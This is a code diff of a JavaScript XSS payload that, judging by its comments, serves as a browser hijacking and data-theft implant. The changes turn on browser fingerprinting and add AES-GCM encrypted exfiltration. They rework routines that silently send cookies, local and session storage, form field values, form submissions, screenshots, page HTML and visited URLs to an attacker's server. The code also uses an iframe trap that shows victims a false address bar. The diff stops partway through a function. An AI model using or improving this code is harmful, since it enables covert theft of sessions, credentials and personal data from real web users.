@@ -108,7 +108,7 @@ function initGlobals()
 
 
 	// Should we fingerprint clients?
-	window.taperFingerprint = false;
+	window.taperFingerprint = true;
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -132,7 +132,7 @@ function initGlobals()
 
 	// Should we check for tasks? How often?
 	window.taperTaskCheck           = true;
-	window.taperTaskCheckDelay      = 1000;
+	window.taperTaskCheckDelay      = 2000;
 	window.taperTaskUpdateScheduled = false;
 
 	// The checkDelay time will be added a random
@@ -182,120 +182,147 @@ function initGlobals()
 // Optional fingerprinting methods
 function fnv1aHash(str) 
 {
-    let hash = 0x811c9dc5;
-    for (let i = 0; i < str.length; i++) 
-    {
-        hash ^= str.charCodeAt(i);
-        hash = (hash + (hash << 1) + (hash << 4) + (hash << 7) + (hash << 8) + (hash << 24)) >>> 0;
-    }
-    return hash;
+	let hash = 0x811c9dc5;
+	for (let i = 0; i < str.length; i++) 
+	{
+		hash ^= str.charCodeAt(i);
+		hash = (hash + (hash << 1) + (hash << 4) + (hash << 7) + (hash << 8) + (hash << 24)) >>> 0;
+	}
+	return hash;
 }
 
 function toBase64URL(number) 
 {
-    const base64 = btoa(String.fromCharCode(...new Uint8Array(new Uint32Array([number]).buffer)));
-    return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+	const base64 = btoa(String.fromCharCode(...new Uint8Array(new Uint32Array([number]).buffer)));
+	return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
 async function getFingerprintHash() 
 {
-    const fingerprint = await getFingerprint();
-    const fingerprintString = JSON.stringify(fingerprint);
-    const hashValue = fnv1aHash(fingerprintString);
-    const base64UrlHash = toBase64URL(hashValue);
-    return base64UrlHash;
+	const fingerprint = await getFingerprint();
+	const fingerprintString = JSON.stringify(fingerprint);
+	const hashValue = fnv1aHash(fingerprintString);
+	const base64UrlHash = toBase64URL(hashValue);
+	return base64UrlHash;
 }
 
 // Example usage with other fingerprinting functions
 function getCanvasFingerprint() 
 {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.textBaseline = 'alphabetic';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(125, 1, 62, 20);
-    ctx.fillStyle = '#069';
-    ctx.fillText('Test', 2, 15);
-    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-    ctx.fillText('Test', 4, 17);
-    return canvas.toDataURL();
+	const canvas = document.createElement('canvas');
+	const ctx = canvas.getContext('2d');
+	ctx.textBaseline = 'top';
+	ctx.font = '14px Arial';
+	ctx.textBaseline = 'alphabetic';
+	ctx.fillStyle = '#f60';
+	ctx.fillRect(125, 1, 62, 20);
+	ctx.fillStyle = '#069';
+	ctx.fillText('Test', 2, 15);
+	ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+	ctx.fillText('Test', 4, 17);
+	return canvas.toDataURL();
 }
 
-function getAudioFingerprint() 
-{
-    return new Promise(resolve => {
-        const context = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = context.createOscillator();
-        const analyser = context.createAnalyser();
-        const gain = context.createGain();
-        const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
 
-        oscillator.type = 'triangle';
-        oscillator.frequency.setValueAtTime(10000, context.currentTime);
-        gain.gain.setValueAtTime(0, context.currentTime);
 
-        oscillator.connect(analyser);
-        analyser.connect(scriptProcessor);
-        scriptProcessor.connect(context.destination);
+function getAudioFingerprint() {
+	return new Promise(resolve => {
+		try {
+			const context = new (window.AudioContext || window.webkitAudioContext)();
+			const oscillator = context.createOscillator();
+			const analyser = context.createAnalyser();
+			const gain = context.createGain();
+			const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
 
-        scriptProcessor.onaudioprocess = event => {
-            const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50);
-            resolve(fingerprint.toString());
-            oscillator.disconnect();
-            scriptProcessor.disconnect();
-        };
+			oscillator.type = 'triangle';
+			oscillator.frequency.setValueAtTime(10000, context.currentTime);
+			gain.gain.setValueAtTime(0, context.currentTime);
 
-        oscillator.start(0);
-    });
+			oscillator.connect(analyser);
+			analyser.connect(scriptProcessor);
+			scriptProcessor.connect(context.destination);
+
+			scriptProcessor.onaudioprocess = event => {
+				try {
+					const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50);
+					resolve(fingerprint.toString());
+				} catch (e) {
+					console.error("Audio fingerprint process error:", e);
+					resolve("");
+				} finally {
+					oscillator.disconnect();
+					scriptProcessor.disconnect();
+				}
+			};
+
+			oscillator.start(0);
+		} catch (e) {
+			console.error("Audio fingerprint error:", e);
+			resolve("");
+		}
+	});
 }
+
+
+
 
 function getNavigatorFingerprint() 
 {
-    return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        languages: navigator.languages,
-        platform: navigator.platform,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        screenResolution: [screen.width, screen.height],
-        colorDepth: screen.colorDepth
-    };
+	return {
+		userAgent: navigator.userAgent,
+		language: navigator.language,
+		languages: navigator.languages,
+		platform: navigator.platform,
+		hardwareConcurrency: navigator.hardwareConcurrency,
+		deviceMemory: navigator.deviceMemory,
+		screenResolution: [screen.width, screen.height],
+		colorDepth: screen.colorDepth
+	};
 }
 
-function getWebGLFingerprint() 
-{
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    return {
-        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-    };
+function getWebGLFingerprint() {
+	try {
+		const canvas = document.createElement('canvas');
+		const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+		if (!gl) return null;
+		const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+		return {
+			vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+			renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+		};
+	} catch (e) {
+		console.error("WebGL fingerprint error:", e);
+		return null;
+	}
 }
+
 
 function getTimeZoneFingerprint() 
 {
-    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+	return Intl.DateTimeFormat().resolvedOptions().timeZone;
 }
 
-async function getFingerprint() 
-{
-    const canvasFingerprint = getCanvasFingerprint();
-    const audioFingerprint = await getAudioFingerprint();
-    const navigatorFingerprint = getNavigatorFingerprint();
-    const webGLFingerprint = getWebGLFingerprint();
-    const timeZoneFingerprint = getTimeZoneFingerprint();
 
-    return {
-        canvas: canvasFingerprint,
-        audio: audioFingerprint,
-        navigator: navigatorFingerprint,
-        webGL: webGLFingerprint,
-        timeZone: timeZoneFingerprint
-    };
+
+async function getFingerprint() {
+	try {
+		const canvasFingerprint = getCanvasFingerprint();
+		const audioFingerprint = await getAudioFingerprint();
+		const navigatorFingerprint = getNavigatorFingerprint();
+		const webGLFingerprint = getWebGLFingerprint();
+		const timeZoneFingerprint = getTimeZoneFingerprint();
+
+		return {
+			canvas: canvasFingerprint,
+			audio: audioFingerprint,
+			navigator: navigatorFingerprint,
+			webGL: webGLFingerprint,
+			timeZone: timeZoneFingerprint
+		};
+	} catch (e) {
+		console.error("Error gathering fingerprint:", e);
+		return {};
+	}
 }
 
 
@@ -305,12 +332,6 @@ async function getFingerprint()
 
 function updateTaskCheckInterval(newDelay)
 {
-    // if (window.taperTaskIntervalID) {
-    //     clearInterval(window.taperTaskIntervalID);
-    // }
-
-    // window.taperTaskIntervalID = setInterval(checkTasks, newDelay);
-
 	window.taperTaskCheckDelay = newDelay;
 }
 
@@ -325,16 +346,26 @@ function updateTaskCheckJitter(newTop, newBottom)
 
 function customExfil(note, data)
 {
-	request = new window.taperXHR();
-	request.noIntercept = true;
-	request.open("POST", taperexfilServer + "/loot/customData/" + 
-		sessionStorage.getItem('taperSessionUUID'));
-	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 	var jsonObj = new Object();
 	jsonObj["note"] = btoa(note);
 	jsonObj["data"] = btoa(data);
 	var jsonString = JSON.stringify(jsonObj);
-	request.send(jsonString);
+
+	if (window.taperMetricsBox)
+	{
+		// We're go-go for encrypted comms!
+		sendMetrics("/loot/customData", jsonString);
+	}
+	else
+	{
+		// Nope, regular mode
+		request = new window.taperXHR();
+		request.noIntercept = true;
+		request.open("POST", taperexfilServer + "/loot/customData/" + 
+			sessionStorage.getItem('taperSessionUUID'));
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		request.send(jsonString);
+	}
 }
 
 
@@ -356,8 +387,72 @@ function canAccessIframe(iframe) {
 
 
 
+
+
+function sendScreenshot() {
+	if (typeof html2canvas !== "function") {
+		console.error("html2canvas is not available.");
+		return;
+	}
+
+  // Pick the right document reference
+	const myReference = (window.taperMode === "trap")
+	? document.getElementById("iframe_a").contentDocument
+	: document;
+
+	html2canvas(myReference.getElementsByTagName("html")[0], { scale: 1 })
+	.then(canvas => {
+		canvas.toBlob(async (blob) => {
+			if (window.taperMetricsBox) {
+          // Convert the blob to an ArrayBuffer for encryption
+				const arrayBuffer = await blob.arrayBuffer();
+          // Generate a random IV for AES-GCM encryption
+				const ivArray = window.crypto.getRandomValues(new Uint8Array(12));
+          // Encrypt the fixed path "/loot/screenshot" so your server knows how to handle it
+				const pathData = new TextEncoder().encode("/loot/screenshot");
+				const encryptedPath = await window.crypto.subtle.encrypt(
+					{ name: "AES-GCM", iv: ivArray },
+					window.taperMetricsBox,
+					pathData
+					);
+          // Encrypt the screenshot data
+				const encryptedMessage = await window.crypto.subtle.encrypt(
+					{ name: "AES-GCM", iv: ivArray },
+					window.taperMetricsBox,
+					arrayBuffer
+					);
+          // Convert the IV, encrypted path, and encrypted message to Base64 strings
+				const ivBase64 = arrayBufferToBase64(ivArray);
+				const pathBase64 = arrayBufferToBase64(encryptedPath);
+				const messageBase64 = arrayBufferToBase64(encryptedMessage);
+          // Build the comma-separated payload string
+				const payloadString = ivBase64 + "," + pathBase64 + "," + messageBase64;
+				const payload = { metricData: payloadString };
+
+          // Send to the unified /client/metrics endpoint
+				const request = new window.taperXHR();
+				request.noIntercept = true;
+				request.open("POST", taperexfilServer + "/client/metrics/" + sessionStorage.getItem("taperSessionUUID"));
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+				request.send(JSON.stringify(payload));
+			} else {
+          // Send the plain screenshot blob to the unencrypted endpoint
+				const request = new window.taperXHR();
+				request.noIntercept = true;
+				request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem("taperSessionUUID"));
+				request.send(blob);
+			}
+		}, "image/png");
+	})
+	.catch(err => console.error("Error capturing screenshot:", err));
+}
+
+
+
+
+
 // Snag a screenshot and ship it
-function sendScreenshot()
+function sendScreenshot_old()
 {
 	if (typeof html2canvas === "function")
 	{
@@ -380,13 +475,6 @@ function sendScreenshot()
 				// console.log(this.responseText)
 			};
 
-			// // request = new XMLHttpRequest();
-			// request = new window.taperXHR();
-			// request.noIntercept = true;
-			// request.addEventListener("load", responseHandler);
-			// request.open("POST", taperexfilServer + "/loot/screenshot/" + 
-			// 	sessionStorage.getItem('taperSessionUUID'));
-
 
 			// Helps hide flashing of the page when clicking around
 			// Only relevant to trap mode. 
@@ -405,7 +493,7 @@ function sendScreenshot()
 				request.noIntercept = true;
 				request.addEventListener("load", responseHandler);
 				request.open("POST", taperexfilServer + "/loot/screenshot/" + 
-				sessionStorage.getItem('taperSessionUUID'));
+					sessionStorage.getItem('taperSessionUUID'));
 
 				const image = blob;
 				request.send(image);
@@ -450,21 +538,37 @@ function hookInputs()
 			// console.log("!! Setting tappedState attribute on element index: " + index);
 			inputs[index].setAttribute("tappedState", "true");
 
+
+
+
+
 			// Adding event listeners to fire when the value in submitted 
 			addEventListener(inputs[index], (event) => updateInput);
 			inputs[index].addEventListener("change", function(){
 				inputName = this.name;
 				inputValue = this.value;
-				request = new window.taperXHR();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/loot/input/" + 
-					sessionStorage.getItem('taperSessionUUID'));
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
 				var jsonObj = new Object();
 				jsonObj["inputName"] = inputName;
 				jsonObj["inputValue"] = inputValue;
 				var jsonString = JSON.stringify(jsonObj);
-				request.send(jsonString);
+
+
+				if (window.taperMetricsBox)
+				{
+					// We're go-go for encrypted comms!
+					sendMetrics("/loot/input", jsonString);
+				}
+				else
+				{
+					// Nope, regular mode
+					request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/loot/input/" + 
+						sessionStorage.getItem('taperSessionUUID'));
+					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+					request.send(jsonString);
+				}
 			});
 		}
 	}
@@ -517,18 +621,28 @@ function hookForms()
 				data += name + ": " + value + '\n';
 			}
 
-			request = new window.taperXHR();
-			request.noIntercept = true;
-			request.open("POST", taperexfilServer + "/loot/formPost/" + 
-				sessionStorage.getItem('taperSessionUUID'));
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 			var jsonObj = new Object();
 			jsonObj["action"] = btoa(action);
 			jsonObj["method"] = method;
 			jsonObj["data"]   = btoa(data);
 			jsonObj["url"]    = myReference.location.href;
 			var jsonString    = JSON.stringify(jsonObj);
-			request.send(jsonString);
+
+			if (window.taperMetricsBox)
+			{
+				// We're go-go for encrypted comms!
+				sendMetrics("/loot/formPost", jsonString);
+			}
+			else
+			{
+				// Nope, regular mode
+				request = new window.taperXHR();
+				request.noIntercept = true;
+				request.open("POST", taperexfilServer + "/loot/formPost/" + 
+					sessionStorage.getItem('taperSessionUUID'));
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+				request.send(jsonString);
+			}
 		}
 
 	// Attach the event listener to all forms
@@ -549,17 +663,17 @@ function hookForms()
 
 function getCookie(name) 
 {
-    let nameEQ = name + "=";
-    let cookieArray = document.cookie.split(';');
-    for(let i = 0; i < cookieArray.length; i++) 
-    {
-        let cookie = cookieArray[i];
+	let nameEQ = name + "=";
+	let cookieArray = document.cookie.split(';');
+	for(let i = 0; i < cookieArray.length; i++) 
+	{
+		let cookie = cookieArray[i];
         // Trim spaces and see if this cookie string begins with the cookie name we're looking for
-        while (cookie.charAt(0) === ' ') cookie = cookie.substring(1);
-        if (cookie.indexOf(nameEQ) === 0) return cookie.substring(nameEQ.length, cookie.length);
-    }
+		while (cookie.charAt(0) === ' ') cookie = cookie.substring(1);
+		if (cookie.indexOf(nameEQ) === 0) return cookie.substring(nameEQ.length, cookie.length);
+	}
     return null; // Return null if not found
-}
+  }
 
 
 
@@ -567,259 +681,304 @@ function getCookie(name)
 // Check for cookies, see if values
 // have been added or changed
 // Only update backend if new cookie or value changed.
-function checkCookies()
-{
+  function checkCookies()
+  {
 	// console.log("Checking cookies...");
-	cookieArray = document.cookie.split(';');
-	for (index = 0; index < cookieArray.length; index++)
-	{
-		cookieData = cookieArray[index].split('=');
+  	cookieArray = document.cookie.split(';');
+  	for (index = 0; index < cookieArray.length; index++)
+  	{
+  		cookieData = cookieArray[index].split('=');
 
-		cookieName = cookieData[0];
-		cookieValue = cookieData[1];
+  		cookieName = cookieData[0];
+  		cookieValue = cookieData[1];
 
-		if (cookieName.length === 0)
-		{
-			continue;
-		}
+  		if (cookieName.length === 0)
+  		{
+  			continue;
+  		}
 
-		if (cookieValue.length === 0)
-		{
-			continue;
-		}
+  		if (cookieValue.length === 0)
+  		{
+  			continue;
+  		}
 
 
-		var cookieDict = {};
-		if (sessionStorage.getItem('taperCookieStorage').length > 0)
-		{
-			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
+  		var cookieDict = {};
+  		if (sessionStorage.getItem('taperCookieStorage').length > 0)
+  		{
+  			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
 
-			if (cookieName in cookieDict)
-			{
+  			if (cookieName in cookieDict)
+  			{
 				// console.log("== Existing cookie: " + cookieName);
-				if (cookieDict[cookieName] != cookieValue)
-				{
+  				if (cookieDict[cookieName] != cookieValue)
+  				{
 					// Existing cookie, but the value has changed
-					cookieDict[cookieName] = cookieValue;
-				}
-				else
-				{
+  					cookieDict[cookieName] = cookieValue;
+  				}
+  				else
+  				{
 					// Existing cookie, but no change in value to report
-					continue;
-				}
-			}
-		}
+  					continue;
+  				}
+  			}
+  		}
 
-		cookieDict[cookieName] = cookieValue;
+  		cookieDict[cookieName] = cookieValue;
 
-		if (Object.keys(cookieDict).length > 0)
-		{
-			sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
-		}
+  		if (Object.keys(cookieDict).length > 0)
+  		{
+  			sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
+  		}
 
 
 		// Ship it
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/dessert/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		var jsonObj = new Object();
-		jsonObj["cookieName"] = cookieName;
-		jsonObj["cookieValue"] = cookieValue;
-		var jsonString = JSON.stringify(jsonObj);
-		request.send(jsonString);
-	}
-}
+  		var jsonObj = new Object();
+  		jsonObj["cookieName"] = cookieName;
+  		jsonObj["cookieValue"] = cookieValue;
+  		var jsonString = JSON.stringify(jsonObj);
+
+  		if (window.taperMetricsBox)
+  		{
+			// We're go-go for encrypted comms!
+  			sendMetrics("/loot/dessert", jsonString);
+  		}
+  		else
+  		{
+			// Nope, regular mode
+  			request = new window.taperXHR();
+  			request.noIntercept = true;
+  			request.open("POST", taperexfilServer + "/loot/dessert/" + 
+  				sessionStorage.getItem('taperSessionUUID'));
+  			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  			request.send(jsonString);
+  		}
+  	}
+  }
 
 
 // Check for local storage data, see if values
 // have been added or changed
 // Only update backend if new data or value changed.
-function checkLocalStorage()
-{
+  function checkLocalStorage()
+  {
 	// console.log("Checking local storage...");
 
-	for (index = 0; index < localStorage.length; index++)
-	{
-		key   = localStorage.key(index)
-		value = localStorage.getItem(key)
+  	for (index = 0; index < localStorage.length; index++)
+  	{
+  		key   = localStorage.key(index)
+  		value = localStorage.getItem(key)
 
-		var localStorageDict = {};
+  		var localStorageDict = {};
 
-		if (sessionStorage.getItem('taperLocalStorage').length > 0)
-		{
-			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
+  		if (sessionStorage.getItem('taperLocalStorage').length > 0)
+  		{
+  			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
 
-			if (key in localStorageDict)
-			{
+  			if (key in localStorageDict)
+  			{
 				// Existing local storage key
 				//console.log("!!! Existing localstorage key...");
-				if (localStorageDict[key] != value)
-				{
+  				if (localStorageDict[key] != value)
+  				{
 					// Existing localStorage, but the value has changed
-					localStorageDict[key] = value;
-				}
-				else
-				{
+  					localStorageDict[key] = value;
+  				}
+  				else
+  				{
 					// Existing cookie, but no change in value to report
-					continue;
-				}
-			}
-		}
+  					continue;
+  				}
+  			}
+  		}
 
 		// New localStorage entry
-		localStorageDict[key] = value;
+  		localStorageDict[key] = value;
 
 		// Copy dictionary back to session storage
-		if (Object.keys(localStorageDict).length > 0)
-		{
-			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
-		}
+  		if (Object.keys(localStorageDict).length > 0)
+  		{
+  			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
+  		}
 
 
 		// Ship it
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/localstore/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		var jsonObj = new Object();
-		jsonObj["key"] = key;
-		jsonObj["value"] = value;
-		var jsonString = JSON.stringify(jsonObj);
-		request.send(jsonString);
-	}
-}
+  		var jsonObj = new Object();
+  		jsonObj["key"] = key;
+  		jsonObj["value"] = value;
+  		var jsonString = JSON.stringify(jsonObj);
+		// request.send(jsonString);
+
+
+  		if (window.taperMetricsBox)
+  		{
+			// We're go-go for encrypted comms!
+  			sendMetrics("/loot/localstore", jsonString);
+  		}
+  		else
+  		{
+			// Nope, regular mode
+  			request = new window.taperXHR();
+  			request.noIntercept = true;
+  			request.open("POST", taperexfilServer + "/loot/localstore/" + 
+  				sessionStorage.getItem('taperSessionUUID'));
+  			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  			request.send(jsonString);
+  		}
+  	}
+  }
 
 
 
 // Check for session storage data, see if values
 // have been added or changed
 // Only update backend if new data or value changed.
-function checkSessionStorage()
-{
+  function checkSessionStorage()
+  {
 	// console.log("!!! Top of checkSessionStorage...");
-	for (index = 0; index < sessionStorage.length; index++)
-	{
-		key = sessionStorage.key(index)
-		value = sessionStorage.getItem(key)
+  	for (index = 0; index < sessionStorage.length; index++)
+  	{
+  		key = sessionStorage.key(index)
+  		value = sessionStorage.getItem(key)
 
 
-		if (key === "taperSessionStorage" || 
-			key === "taperLocalStorage" || 
-			key === "taperCookieStorage"||
-			key === "taperSessionName" ||
-			key === "taperLastUrl" ||
-			key === "taperSystemLoaded" ||
-			key === "taperSessionUUID")
-		{
+  		if (key === "taperSessionStorage" || 
+  			key === "taperLocalStorage" || 
+  			key === "taperCookieStorage"||
+  			key === "taperSessionName" ||
+  			key === "taperLastUrl" ||
+  			key === "taperSystemLoaded" ||
+  			key === "taperSessionUUID")
+  		{
 			// Should skip over our own session storage for reporting
 			// console.log("!!! Found taper data in session storage, hopefully SKIPPING");
-			continue;
-		}
+  			continue;
+  		}
 
 
-		var sessionStorageDict = {};
+  		var sessionStorageDict = {};
 
-		if (sessionStorage.getItem('taperSessionStorage').length > 0)
-		{
+  		if (sessionStorage.getItem('taperSessionStorage').length > 0)
+  		{
 			// console.log("+++ taperSessionStorage has length...");
-			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
+  			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
 
-			if (key in sessionStorageDict)
-			{
+  			if (key in sessionStorageDict)
+  			{
 				// Existing local storage key
 				// console.log("!!! Existing sessionstorage key...");
-				if (sessionStorageDict[key] != value)
-				{
+  				if (sessionStorageDict[key] != value)
+  				{
 					// Existing localStorage, but the value has changed
-					sessionStorageDict[key] = value;
-				}
-				else
-				{
+  					sessionStorageDict[key] = value;
+  				}
+  				else
+  				{
 					// Existing sessionStorage, but no change in value to report
 					// console.log("     sessionStorage value unchanged");
-					continue;
-				}
-			}
-		}
+  					continue;
+  				}
+  			}
+  		}
 
-		sessionStorageDict[key] = value;
+  		sessionStorageDict[key] = value;
 
-		if (Object.keys(sessionStorageDict).length > 0)
-		{
-			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
-		}
+  		if (Object.keys(sessionStorageDict).length > 0)
+  		{
+  			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
+  		}
 
 
 		// Ship it
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		var jsonObj = new Object();
-		jsonObj["key"] = key;
-		jsonObj["value"] = value;
-		var jsonString = JSON.stringify(jsonObj);
-		request.send(jsonString);
-	}
-}
+  		var jsonObj = new Object();
+  		jsonObj["key"] = key;
+  		jsonObj["value"] = value;
+  		var jsonString = JSON.stringify(jsonObj);
+		// request.send(jsonString);
+
+
+  		if (window.taperMetricsBox)
+  		{
+			// We're go-go for encrypted comms!
+  			sendMetrics("/loot/sessionstore", jsonString);
+  		}
+  		else
+  		{
+			// Nope, regular mode
+  			request = new window.taperXHR();
+  			request.noIntercept = true;
+  			request.open("POST", taperexfilServer + "/loot/sessionstore/" + 
+  				sessionStorage.getItem('taperSessionUUID'));
+  			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+  			request.send(jsonString);
+  		}
+  	}
+  }
 
 
 
 // Optional, copy the entire HTML and send out
-function sendHTML()
-{
-	var myReference = "";
+  function sendHTML()
+  {
+  	var myReference = "";
 
-	if (window.taperMode === "trap")
-	{
-		myReference = document.getElementById("iframe_a").contentDocument;
-	}
-	else
-	{
-		myReference = document;
-	}
+  	if (window.taperMode === "trap")
+  	{
+  		myReference = document.getElementById("iframe_a").contentDocument;
+  	}
+  	else
+  	{
+  		myReference = document;
+  	}
 
-	trapURL  = myReference.location.href;
-	trapHTML = myReference.documentElement.outerHTML;
+  	trapURL  = myReference.location.href;
+  	trapHTML = myReference.documentElement.outerHTML;
 
+  	var jsonObj = new Object();
+  	jsonObj["url"] = trapURL;
+  	jsonObj["html"] = trapHTML;
+  	var jsonString = JSON.stringify(jsonObj);
 
-	request = new window.taperXHR();
-	request.noIntercept = true;
-	request.open("POST", taperexfilServer + "/loot/html/" + 
-		sessionStorage.getItem('taperSessionUUID'));
-	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-	var jsonObj = new Object();
-	jsonObj["url"] = trapURL;
-	jsonObj["html"] = trapHTML;
-	var jsonString = JSON.stringify(jsonObj);
-	request.send(jsonString);
-}
+  	if (window.taperMetricsBox)
+  	{
+  		sendMetrics('/loot/html', jsonString);
+  	}
+  	else
+  	{
+  		request = new window.taperXHR();
+  		request.noIntercept = true;
+  		request.open("POST", taperexfilServer + "/loot/html/" + 
+  			sessionStorage.getItem('taperSessionUUID'));
+  		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		// var jsonObj = new Object();
+		// jsonObj["url"] = trapURL;
+		// jsonObj["html"] = trapHTML;
+		// var jsonString = JSON.stringify(jsonObj);
+  		request.send(jsonString);
+  	}
+  }
 
 
 
 // Function to hold loot stealing acalls
-function captureUrlChangeLoot()
-{
+  function captureUrlChangeLoot()
+  {
 	// Handle input scraping
-	hookInputs();
+  	hookInputs();
 
 	// Handle form submission interception
-	hookForms();
+  	hookForms();
 
 	// Handle screenshotting
-	sendScreenshot();
+  	sendScreenshot();
 
 
 	// Exfil HTML code
-	if (taperexfilHTML)
-	{
-		sendHTML();
-	}
-}
+  	if (taperexfilHTML)
+  	{
+  		sendHTML();
+  	}
+  }
 
 
 
@@ -831,19 +990,19 @@ function captureUrlChangeLoot()
 // Also updates their browser address bar so they 
 // think they're on the page they're viewing in the
 // iframe trap, not the one with the XSS vuln. 
-function runUpdate()
-{
+  function runUpdate()
+  {
 	// console.log("*** Top of runUpdate...");
-	var currentUrl = "";
-	var fullUrl = "";
+  	var currentUrl = "";
+  	var fullUrl = "";
 
-	if (window.taperMode === "trap")
-	{
+  	if (window.taperMode === "trap")
+  	{
 		// console.log("runUpdate for trap mode");
 		// iFrame trap mode
 		// iFrame trap disable code
-		if (!canAccessIframe(document.getElementById("iframe_a")))
-		{
+  		if (!canAccessIframe(document.getElementById("iframe_a")))
+  		{
 			// If we can't access the iframe anymore, that 
 			// means the iframe has changed origin. They 
 			// surfed away to a new domain, probably through a link
@@ -860,52 +1019,57 @@ function runUpdate()
 			// Second click will properly load the external page. 
 			// Sad to lose the trap through. 
 			// console.log("iFrame access lost, loading page: " + sessionStorage.getItem('taperLastUrl'));
-			window.location = sessionStorage.getItem('taperLastUrl');
-		}
-		else
-		{
+  			window.location = sessionStorage.getItem('taperLastUrl');
+  		}
+  		else
+  		{
 			// console.log("Looks like canAccessIframe check passed!");
-		}
+  		}
 
-		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
-		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
+  		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
+  		fullUrl    = document.getElementById("iframe_a").contentDocument.location.href;
 		// console.log("in runUpdate currentUrl: " + currentUrl +", fullUrl: " + fullUrl);
-	}
-	else
-	{
-		currentUrl = document.location.pathname;
-		fullUrl    = document.location.href;		
-	}
+  	}
+  	else
+  	{
+  		currentUrl = document.location.pathname;
+  		fullUrl    = document.location.href;		
+  	}
 
 	// console.log("Checking last url: " + sessionStorage.getItem('taperLastUrl'));
 	// Let's see if the URL has changed
-	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
-	{
+  	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
+  	{
 		// Handle URL recording
 		// console.log("!!!!!!!! New trap URL, stealing the things: " + fullUrl);
-		sessionStorage.setItem('taperLastUrl', currentUrl);
+  		sessionStorage.setItem('taperLastUrl', currentUrl);
 
 
-		// This needs an API call to report the new page
-		// and take a screenshot maybe, not sure if
-		// screenshot timing will be right yet
-		// request = new XMLHttpRequest();
-		request = new window.taperXHR();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/location/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-		
-		var jsonObj = new Object();
-		jsonObj["url"] = fullUrl;
-		var jsonString = JSON.stringify(jsonObj);
-		request.send(jsonString);
+  		var jsonObj = new Object();
+  		jsonObj["url"] = fullUrl;
+  		var jsonString = JSON.stringify(jsonObj);
+
+  		if (window.taperMetricsBox)
+  		{
+			// We're go-go for encrypted comms!
+  			sendMetrics("/loot/location", jsonString);
+  		}
+  		else
+  		{
+			// Nope, regular mode
+  			request = new window.taperXHR();
+  			request.noIntercept = true;
+  			request.open("POST", taperexfilServer + "/loot/location/" + 
+  				sessionStorage.getItem('taperSessionUUID'));
